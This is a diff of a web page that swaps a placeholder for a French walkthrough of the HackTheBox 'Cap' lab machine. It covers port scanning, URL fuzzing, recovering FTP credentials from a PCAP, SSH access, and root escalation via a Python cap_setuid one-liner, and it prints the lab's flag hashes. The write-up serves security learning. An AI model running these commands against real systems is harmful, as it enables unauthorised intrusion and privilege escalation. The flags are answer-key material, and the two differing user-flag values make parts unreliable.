@@ -198,28 +198,129 @@
                 <div class="writeup-content">
                     <script type="text/markdown">
                         # HackTheBox - Cap Machine - Easy
-
-                        ## Introduction
-                        Ce writeup décrit la résolution de la machine "Cap" sur HackTheBox, une machine facile pour les débutants en pentest.
-
-                        ## Étapes
-                        1. **Scan initial** : Utilisation de `nmap` pour identifier les ports ouverts.
-                        ```bash
-                        nmap -sC -sV -oA scan 10.10.10.10
-                        ```
-                        ![Capture d'écran étape 1 - Scan Nmap](https://fr3nch4sec.github.io/images/Cap_img_1.webp)
                         
-                        2. **Exploitation** : Découverte d'une vulnérabilité dans un service web (par exemple, une faille d'authentification faible).
-                        ```bash
-                        # Exemple d'exploitation
-                        hydra -l admin -P passwords.txt ssh://10.10.10.10
-                        ```
-                        ![Capture d'écran étape 2 - Exploitation](https://fr3nch4sec.github.io/images/Cap_img_2.webp)
+                                        1. **Reconnaisance**
 
-                        3. **Accès root** : Escalade de privilèges via un fichier SUID mal configuré.
+                            ### Scan des ports
 
-                        ## Conclusion
-                        Une excellente machine pour apprendre les bases de l'énumération et de l'exploitation simple.
+                            Le Firewall de la machine bloque les scans basique, avec transaction 'SynAck' complète.
+                            J'utilise Naabu qui en premier avec Nmap sur chaque machine, car c'est super rapide.
+
+                            Donc, j'ai utilisé le flag ``-sS`` dans Nmap, pour ignitier la connection avec l'envoie de paquets. Si nmap reçoit la réponse, le port est considéré comme ouvert.
+
+                                ``sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v``
+
+                                ````
+                                PORT   STATE   SERVICE   VERSION
+                                21 / tcp  open     ftp     vsftpd 3.0.3
+                                22 / tcp  open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+                                80 / tcp  open    http    gunicorn
+                                ````
+                
+
+                            ### Fuzzing de l'url avec Ffuf et Gobuster:
+
+                                ``ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1``
+
+                                ``ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/dns/subdomains-top1million-5000.txt``
+
+                            #### Résultats obtenus:
+
+                                ``  
+                                /ip
+                                /netstat
+                                /data
+                                ``
+
+                            ### Ensuite:
+
+                            J'ai poursuivis la recherche de domaines et d'extensions potentielles.
+
+                            Après un fuzzing par récursion, j'ai trouvé une page à '/data/0'. 
+                            Cet page permet de télécharger un fichier PCAP, lié à l'utilisateur.
+
+                            Chose bizarre. La page était lié au même utilisateur mais les données présentes dans le Pcap, différaient légèrement.
+
+                            Pendant le fuzzing du domaine, le snapshot indiquait zéro en terme de paquets à chaque types(TCP, UDP, etc...).
+
+                            J'ai download les PCAP à plusieurs reprises pour les comparer. 
+                            Je les aient inspecté avec Wireshark sans résultats. À première vue en tout cas.
+                            J'ai trouvé sur des forums, des docs et autres, comment filtrer les données. Car oui, je pratique peu wireshark.
+                            J'ai donc lancé 'Protocol Hierarchy' sur le protocole FTP.
+                    
+                            En examinant les en-têtes, le mot de passe s'affiche directement. Et l'utilisateur, dans un paquet avec une IP liée à celui contenant le mot de passe.
+
+                        
+                            ![Capture d'écran étape 1 - Scan Nmap](https://fr3nch4sec.github.io/images/Cap_img_1.webp)
+                        
+
+
+                                        2. **Exploitation** :
+
+                            #### Connexion SSH avec id & password
+
+                            Je me suis servi de ce password afin de me connecter via SSH, avec le user 'nathan'.
+                        
+                                ``ssh nathan@10.10.10.245``
+
+
+                            On est dans la machine. 🖥️🖥️
+                            
+                            J'ai téléchargé Linpeas 🤔
+                        
+                                ``
+                                nathan@cap:~$ **ls  
+                                e.py  linpeas  linpeas.sh  snap  user.txt  
+                                nathan@cap:~$ **cat user.txt**  
+                                d2ee7e0a3b896efed8eeeeab2aeb1ff6
+
+                                nathan@cap:~/snap/bin$ **ls 
+                                Makefile  cve  cve-2021-4034.c  esc  exploit_nss.py  ls  polkit  pwnkit.c
+                                ``
+
+                            J'ai rendu linpeas exécutable, et l'ai lancé.
+
+                                ``
+                                chmod +x linpeas
+                                chmod +x linpeas.sh
+
+                                ./linpeas
+                                ./linpeas.sh
+                                ``
+                            Linpeas a indiqué dans la sortie, que python 3 disposait de la fonction 'cap_setuid' qui peut modifier l'UID d'un processus:
+
+                            ``/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip``
+
+                                ````
+                                nathan@cap:~$ ls
+                                snap  user.txt
+                                nathan@cap:~$ cat user.txt
+                                bd615fdf252a03b75214aebaa4cb0714
+                                ````
+
+                                        3. **Accès root** : Escalade de privilèges via la création un fichier SUID .
+
+                            J'ai cherché sur l'extension Hacktools, sur des writeups, pour trouver comment élever les privilèges depuis un 'user' Linux.
+                            J'en ai essayé plusieurs:
+                            Cette commande m'as permise de passer de User à Root.
+                    
+                            ``nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'``
+
+                            ````
+                                root@cap:~# ls
+                                snap  user.txt
+                                root@cap:~# cd /root
+                                root@cap:/root# ls
+                                root.txt  snap
+                                root@cap:/root# cat root.txt
+                                b17a06939691f0e4f924f37138c32eeb
+                                root@cap:/root#`
+                                ```
+
+                            ![Capture d'écran étape 2 - Exploitation](https://fr3nch4sec.github.io/images/Cap_img_2.webp)
+
+                            ### Conclusion
+                            Une excellente machine pour apprendre les bases de l'énumération et de l'exploitation simple.
                     </script>
                 </div>
             </div>
